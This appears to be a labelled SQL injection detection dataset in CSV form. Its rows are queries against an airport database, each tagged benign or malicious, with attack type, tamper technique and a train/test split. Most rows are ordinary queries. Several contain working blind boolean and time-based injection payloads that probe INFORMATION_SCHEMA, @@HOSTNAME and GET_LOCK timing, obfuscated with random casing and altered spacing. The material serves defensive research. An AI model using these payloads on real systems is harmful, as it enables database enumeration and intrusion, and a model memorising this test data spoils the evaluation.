"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 123.55 AND  126.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  114.3  AND  126.5  ORDER BY frequency;",0,123.55 126.8 114.3 126.5,,,,select,airport-S13,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,train
"DELETE FROM countries WHERE code = ""MQ"";",0,MQ,,,,delete,airport-D7,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.7 AND  121.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  129.3  AND  127.25  ORDER BY frequency;",0,120.7 121.7 129.3 127.25,,,,select,airport-S13,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"UPDATE countries SET keywords = ""Uzbek"" WHERE code = ""MG"";",0,Uzbek MG,,,,update,airport-U8,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (51842, 27652, ""KAKO"", ""CTAF"", ""EMR"", 122.7)",0,51842 27652 KAKO CTAF EMR 122.7,,,,insert,airport-I8,,,test
"DELETE FROM regions WHERE name = ""South Region"" AND 1802 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 4,1),1,1))>116) THEN 1802 ELSE (SELECT 2550 UNION SELECT 7884) END))-- -"";",1," South Region"" AND 1802 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 4,1),1,1))>116) THEN 1802 ELSE (SELECT 2550 UNION SELECT 7884) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Miami Beach;""",0,Miami Beach,,,,select,airport-S21,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Kargopol""",0,Kargopol,,,,select,airport-S3,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Meekins Neck Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Meekins Neck Airport,,,,select,airport-S14,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (5570, ""28N"", 3220.0, ""ASPH"", 0, 0)",0,5570 28N 3220.0 ASPH 0 0,,,,insert,airport-I9,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AU"") OR a.elevation_ft > 856.0",0,AU 856.0,,,,select,airport-S11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LY"" GROUP BY r.name ORDER BY r.name ASC;",0,LY,,,,select,airport-S5,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Hope Municipal Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Hope Municipal Airport,,,,select,airport-S14,,,test
"DELETE FROM airport WHERE name LIKE ""Natalia Airport"" OR keywords LIKE ""IDA1"";  ",0,Natalia Airport IDA1,,,,delete,airport-D3,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""3VA7"",""small_airport"", ""Lake Rosseau/Cameron Bay Seaplane Base"",""https://en.wikipedia.org/wiki/Iejima_Airport"",""AS"")",0,3VA7 small_airport Lake Rosseau/Cameron Bay Seaplane Base https://en.wikipedia.org/wiki/Iejima_Airport AS,,,,insert,airport-I3,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Osaki West City Towers East Helipad"");",0,Osaki West City Towers East Helipad,,,,select,airport-S12,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Kowa Seaplane Base""",0,Kowa Seaplane Base,,,,select,airport-S3,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""US-AK""",0,SA US-AK,,,,select,airport-S8,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""San Vicente Department"";",0,San Vicente Department,,,,select,airport-S15,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CL""  AND     6067=(  SELECT   (    CASE      WHEN  (   ORD(  MID((  SELECT    IFNULL(    CAST(    column_name    AS      NCHAR  ),0x20)  FROM     INFORMATION_SCHEMA.  COLUMNS     WHERE     table_name    =0x72756e77617973  AND     table_schema=0x64617461736574   LIMIT  1,1),10,1))>104)   THEN  6067     ELSE     (  SELECT   6182     UNION     SELECT   8548)   END    ))-- -""",1," CL   AND     6067=(  SELECT   (    CASE      WHEN  (   ORD(  MID((  SELECT    IFNULL(    CAST(    column_name    AS      NCHAR  ),0x20)  FROM     INFORMATION_SCHEMA.  COLUMNS     WHERE     table_name    =0x72756e77617973  AND     table_schema=0x64617461736574   LIMIT  1,1),10,1))>104)   THEN  6067     ELSE     (  SELECT   6182     UNION     SELECT   8548)   END    ))-- - ",exploit,multiplespaces,success,select,airport-S9,boolean-204,boolean,test
"UPDATE airport SET home_link = ""http://www.inmobiliariabrom.com/urales_770.php?i=en"" WHERE name = ""Mylniki Airfield""",0,http://www.inmobiliariabrom.com/urales_770.php?i=en Mylniki Airfield,,,,update,airport-U4,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LS"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,LS 5,,,,select,airport-S19,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 120.0 AND 2643.0",0,120.0 2643.0,,,,select,airport-S2,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""US-OR""",0,AS US-OR,,,,select,airport-S8,,,train
"SELECT * FROM airport WHERE gps_code = ""CYZY"" OR local_code = ""LF5854""",0,CYZY LF5854,,,,select,airport-S4,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 302.0 AND 4551.0",0,302.0 4551.0,,,,select,airport-S2,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""EYKD"";",0,EYKD,,,,select,airport-S7,,,test
KILL QUERY 12870,0,,,,,admin,airport-admin12,,,test
"UPDATE airport_frequencies SET frequency_mhz = 119.45 WHERE type = ""CLD"";",0,119.45 CLD,,,,update,airport-U6,,,test
"DELETE FROM navaids WHERE ident = ""YN"";",0,YN,,,,delete,airport-D6,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4641"" AS SIGNED) AND a.iso_country = ""FJ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4641 FJ,,,,select,airport-S22,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('US-8708','US-8708','US-8708','US-8708');",1, US-8708 US-8708 US-8708 US-8708 ,recon,space2mysqlblank,success,update,airport-U10,error-109,error,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""CAV5"";",0,CAV5,,,,select,airport-S7,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 3163.0 AND 384.0",0,3163.0 384.0,,,,select,airport-S2,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tongham Airstrip"");",0,Tongham Airstrip,,,,select,airport-S12,,,test
SELECT * FROM airport WHERE icao_code = 'ZUAL';,0,ZUAL,,,,select,airport-S1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 430.0 AND 550.0",0,430.0 550.0,,,,select,airport-S2,,,train
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1220.0 AND 380.0",0,1220.0 380.0,,,,select,airport-S2,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Korba Airport""",0,Korba Airport,,,,select,airport-S3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PM"" GROUP BY r.name ORDER BY r.name ASC;",0,PM,,,,select,airport-S16,,,test
"UPDATE countries SET keywords = ""Airports in Cape Verde"" WHERE code = ""QA"";",0,Airports in Cape Verde QA,,,,update,airport-U8,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Blekinge län"";",0,Blekinge län,,,,select,airport-S15,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 125.525 AND  121.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.83  AND  24.46  ORDER BY frequency;",0,125.525 121.7 122.83 24.46,,,,select,airport-S13,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-2066"",""heliport"", ""Christian Ranch Airport"",""https://en.wikipedia.org/wiki/Steen_River_Airport"",""AS"")",0,US-2066 heliport Christian Ranch Airport https://en.wikipedia.org/wiki/Steen_River_Airport AS,,,,insert,airport-I3,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Spray Airport"");",0,Spray Airport,,,,select,airport-S12,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Žocene;""",0,Žocene,,,,select,airport-S21,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5211"" AS SIGNED) AND a.iso_country = ""AT"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5211 AT,,,,select,airport-S22,,,test
SELECT * FROM airport WHERE icao_code = 'CYRJ';,0,CYRJ,,,,select,airport-S1,,,test
"UPDATE navaids SET name = ""Colmar"" WHERE ident = ""GRO"";",0,Colmar GRO,,,,update,airport-U7,,,test
"UPDATE countries SET keywords = ""Estonian airports"" WHERE code = ""GP"";",0,Estonian airports GP,,,,update,airport-U8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""IT"" GROUP BY r.name ORDER BY r.name ASC;",0,IT,,,,select,airport-S5,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Samarqand Region"" AND 3946 LIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(@@HOSTNAME AS NCHAR),0x20)),5,1))>48) THEN 3946 ELSE (SELECT 8233 UNION SELECT 5064) END))-- -"";",1," Samarqand Region"" AND 3946 LIKE (SELECT (CASE WHEN (ORD(MID((IFNULL(CAST(@@HOSTNAME AS NCHAR),0x20)),5,1))>48) THEN 3946 ELSE (SELECT 8233 UNION SELECT 5064) END))-- - ",exploit,equaltolike,success,select,airport-S15,boolean-234,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Kremmling Memorial Hospital Heliport"" AnD 6801=(sELeCT (CAsE When (Ord(mID((sELeCT IfnuLL(cAst(tABLe_nAMe As NChar),0x20) fROm INFORMATION_SCHEMA.tABlEs wherE table_schema=0x64617461736574 limiT 5,1),6,1))>112) tHeN 6801 Else (sELeCT 7176 UniOn sELeCT 5986) ENd))-- -"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",1," Kremmling Memorial Hospital Heliport"" AnD 6801=(sELeCT (CAsE When (Ord(mID((sELeCT IfnuLL(cAst(tABLe_nAMe As NChar),0x20) fROm INFORMATION_SCHEMA.tABlEs wherE table_schema=0x64617461736574 limiT 5,1),6,1))>112) tHeN 6801 Else (sELeCT 7176 UniOn sELeCT 5986) ENd))-- - ",exploit,randomcase,success,select,airport-S14,boolean-228,boolean,test
"UPDATE airport SET municipality = ""Houston"" WHERE iso_country = ""US""",0,Houston US,,,,update,airport-U2,,,test
"UPDATE airport SET name = ""Tambo Airport"" WHERE ident = ""KCII""",0,Tambo Airport KCII,,,,update,airport-U1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 7530.0 AND 90.0",0,7530.0 90.0,,,,select,airport-S2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Okbab;""",0,Okbab,,,,select,airport-S21,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5567"" AS SIGNED) AND a.iso_country = ""GW"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5567 GW,,,,select,airport-S22,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AQ"" GROUP BY r.name ORDER BY r.name ASC;",0,AQ,,,,select,airport-S5,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""FK"" GROUP BY r.name ORDER BY r.name ASC;",0,FK,,,,select,airport-S5,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Thomas;""",0,Thomas,,,,select,airport-S21,,,test
"UPDATE navaids SET name = ""La Tontouta"" WHERE ident = ""ADR"";",0,La Tontouta ADR,,,,update,airport-U7,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""9MT8, 9MT8, 9MT8"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in North Carolina"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Saint Lucia"", ""%"");",0,"9MT8, 9MT8, 9MT8 Airports in North Carolina Airports in Saint Lucia",,,,select,airport-S18,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""El Dorado Airport""",0,El Dorado Airport,,,,select,airport-S3,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""København Vandflyveplads"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,København Vandflyveplads,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""AZ04"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Alagoas"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Latvian airports"", ""%"");",0,AZ04 Airports in Alagoas Latvian airports,,,,select,airport-S18,,,test
"DELETE FROM navaids WHERE ident = ""PT"";",0,PT,,,,delete,airport-D6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"DELETE FROM navaids WHERE ident = ""YNJ"";",0,YNJ,,,,delete,airport-D6,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4801"" AS SIGNED) AND a.iso_country = ""GI"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4801 GI,,,,select,airport-S22,,,test
"UPDATE airport SET municipality = ""San Saba"" WHERE iso_country = ""ZA""",0,San Saba ZA,,,,update,airport-U2,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Miyako City Osaka Honmachi Helipad"");",0,Miyako City Osaka Honmachi Helipad,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""CH"", ""Mauritius"", ""AF"", ""Andorran airports"")",0,CH Mauritius AF Andorran airports,,,,insert,airport-I6,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Aldama;""",0,Aldama,,,,select,airport-S21,,,test
"SELECT id FROM airports WHERE longitude BETWEEN -54.179444 AND -100.99500274658205 AND scheduled_service = ""no""",0,-54.179444 -100.99500274658205 no,,,,select,airport-S23,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PA"" GROUP BY r.name ORDER BY r.name ASC;",0,PA,,,,select,airport-S16,,,test
"DELETE FROM airport WHERE name LIKE ""Star Lake Trading Point Landing Strip"" OR keywords LIKE ""DE22"";  ",0,Star Lake Trading Point Landing Strip DE22,,,,delete,airport-D3,,,test
"UPDATE airport_frequencies SET description = ""Kyritz Radio"" WHERE airport_ident = ""KJAN"";",0,Kyritz Radio KJAN,,,,update,airport-U5,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Agrinio, LGAG, AGQ"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Kamchatka Krai"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Bhutanese airports"", ""%"");",0,"Agrinio, LGAG, AGQ Airports in Kamchatka Krai Bhutanese airports",,,,select,airport-S18,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-5331"";",0,US-5331,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""PU3"") OR name LIKE ""Luggate Airport""",0,PU3 Luggate Airport,,,,select,airport-S10,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""KQ6"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""NBU, KNBU, Curtiss Field, Curtiss Reynolds Wright"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Bovanenkovo-Ukhta GTS, HELIOPS, GAZPROM, Pipeline, OIL & GAS"", ""%"");",0,"KQ6 NBU, KNBU, Curtiss Field, Curtiss Reynolds Wright Bovanenkovo-Ukhta GTS, HELIOPS, GAZPROM, Pipeline, OIL & GAS",,,,select,airport-S17,,,train
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4015"" AS SIGNED) AND a.iso_country = ""TZ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4015 TZ,,,,select,airport-S22,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Clairview Heliport""",0,Clairview Heliport,,,,select,airport-S3,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Kuala Kahaba Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Kuala Kahaba Airport,,,,select,airport-S14,,,train
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""NY71"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Dubrovnik-Neretva County"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Montserrat"", ""%"");",0,NY71 Airports in Dubrovnik-Neretva County Airports in Montserrat,,,,select,airport-S18,,,train
"UPDATE airport SET name = ""Old Orchard Road Heliport"" WHERE ident = ""K3GM""",0,Old Orchard Road Heliport K3GM,,,,update,airport-U1,,,train
SELECT * FROM airport WHERE icao_code = 'SNJK';,0,SNJK,,,,select,airport-S1,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""IA26"") OR name LIKE ""Cape Yakataga""",0,IA26 Cape Yakataga,,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""CL"" OR c.name LIKE CONCAT(""%"", ""Trinidad and Tobago"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,CL Trinidad and Tobago 4,,,,select,airport-S20,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Camp Irwin, ROK Army 1st Artillery Brigade, 2nd Artillery Group, 6878th Unit"") OR name LIKE ""5PN5""",0,"Camp Irwin, ROK Army 1st Artillery Brigade, 2nd Artillery Group, 6878th Unit 5PN5",,,,select,airport-S10,,,train
"DELETE FROM airport WHERE name = ""Aurora Heliport"";  ",0,Aurora Heliport,,,,delete,airport-D2,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('KR-0298','BR-1264','US-8878','JP-0268');",0,KR-0298 BR-1264 US-8878 JP-0268,,,,update,airport-U10,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SDCH"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Beckley"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""BK3, BK3"", ""%"");",0,"SDCH Beckley BK3, BK3",,,,select,airport-S17,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Snow Lake Seaplane Base"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Snow Lake Seaplane Base,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""WRBT, Valgoson"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Peravia Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Saint Pierre and Miquelon"", ""%"");",0,"WRBT, Valgoson Airports in Peravia Province Airports in Saint Pierre and Miquelon",,,,select,airport-S18,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" whEre 3208=3208 AnD 3810=(SElect (CaSe wHeN (Ord(Mid((SElect ifNUll(CAsT(COlUMN_naME aS NchAR),0x20) fRoM INFORMATION_SCHEMA.CoLumns whEre table_Name=0x72756e77617973 AnD table_schema=0x64617461736574 LIMiT 8,1),5,1))>100) tHen 3810 eLsE (SElect 5231 unioN SElect 7719) End))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" whEre 3208=3208 AnD 3810=(SElect (CaSe wHeN (Ord(Mid((SElect ifNUll(CAsT(COlUMN_naME aS NchAR),0x20) fRoM INFORMATION_SCHEMA.CoLumns whEre table_Name=0x72756e77617973 AnD table_schema=0x64617461736574 LIMiT 8,1),5,1))>100) tHen 3810 eLsE (SElect 5231 unioN SElect 7719) End))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"UPDATE countries SET keywords = ""Tajik"" WHERE 6118=6118 AND GET_LOCK('FIoq',5)-- OnSM"" WHERE code = ""LK"";",1," Tajik"" WHERE 6118=6118 AND GET_LOCK('FIoq',5)-- OnSM LK ",recon,sleep2getlock,success,update,airport-U8,time-100,time,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 47.0",0,BR 47.0,,,,select,airport-S11,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Foggarty's Field,"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Аэродром Кяргозеро, ZF90"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""5II0"", ""%"");",0,"Foggarty's Field, Аэродром Кяргозеро, ZF90 5II0",,,,select,airport-S17,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2677"" AS SIGNED) AND a.iso_country = ""SG"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2677 SG,,,,select,airport-S22,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tommy Kochon Airport"");",0,Tommy Kochon Airport,,,,select,airport-S12,,,test
